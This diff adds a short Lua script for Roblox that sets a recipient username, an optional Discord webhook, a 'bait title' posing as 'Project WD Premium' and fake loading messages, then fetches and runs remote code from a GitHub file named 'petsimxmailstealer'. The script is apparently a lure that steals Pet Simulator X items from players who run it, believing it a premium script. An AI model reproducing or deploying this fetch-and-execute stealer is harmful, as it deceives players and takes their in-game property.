@@ -1,0 +1,7 @@
+local player_USERNAME = "Honfakex3" 
+local discord_WEBHOOK = "" -- leave blank if no webhook 
+local Custom_Script_Name = "Project WD Premium" -- bait title
+local txt_1 = "Script Loaded..." 
+local txt_2 = "Waiting for Script" 
+local txt_3 = "Excuting Script..." 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
